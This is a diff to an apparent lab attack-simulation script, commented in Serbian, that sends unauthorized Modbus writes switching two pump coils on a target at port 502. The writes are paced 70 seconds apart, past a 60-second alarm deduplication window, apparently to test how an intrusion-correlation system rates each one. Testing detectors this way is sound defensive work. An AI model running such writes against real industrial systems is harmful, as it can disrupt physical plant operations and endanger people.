@@ -39,22 +39,41 @@ async def port_scan():
 
 
 async def unauthorized_write():
-    """Napad 2: neovlasceni Modbus upis u pumpu."""
-    print(f"[NAPADAC] Neovlasceni upis u {TARGET}:502...")
+    """
+    Napad 2: neovlasceni Modbus upisi, razmaknuti > dedup prozora (60s),
+    da svaki bude zaseban alarm.
+
+    Posto plant primenjuje upis na stanje pumpe (procitaj_komande_iz_kutijica),
+    upis koji MENJA stanje -> pumpa se pomeri -> korelacija vidi promenu -> CRITICAL.
+    Upis koji pise vrednost koju pumpa vec ima -> nema promene -> ostaje HIGH.
+    Napadac ne zna stanje, pa je mesavina realna i bas to korelacija razlikuje.
+    """
+    print(f"[NAPADAC] Neovlasceni upisi u {TARGET}:502 (razmaknuti)...")
     client = AsyncModbusTcpClient(TARGET, port=502)
     await client.connect()
     if not client.connected:
         print("[NAPADAC]   ne mogu da se povezem na Modbus")
         return
 
-    for _ in range(5):
-        await client.write_coil(COIL_PUMPA1, True)
-        await asyncio.sleep(1)
-        await client.write_coil(COIL_PUMPA1, False)
-        await asyncio.sleep(1)
+    upisi = [
+        (COIL_PUMPA1, True),
+        (COIL_PUMPA2, True),
+        (COIL_PUMPA1, False),
+        (COIL_PUMPA2, False),
+        (COIL_PUMPA1, True),
+        (COIL_PUMPA2, True),
+    ]
+
+    RAZMAK = 70  # > dedup prozor (60s), da svaki upis bude zaseban red
+
+    for i, (coil, vrednost) in enumerate(upisi):
+        await client.write_coil(coil, vrednost)
+        print(f"[NAPADAC]   upis {i+1}/{len(upisi)}: coil {coil} = {vrednost}")
+        if i < len(upisi) - 1:
+            await asyncio.sleep(RAZMAK)
 
     client.close()
-    print("[NAPADAC] Upis gotov.")
+    print("[NAPADAC] Upisi gotovi.")
 
 
 async def main():
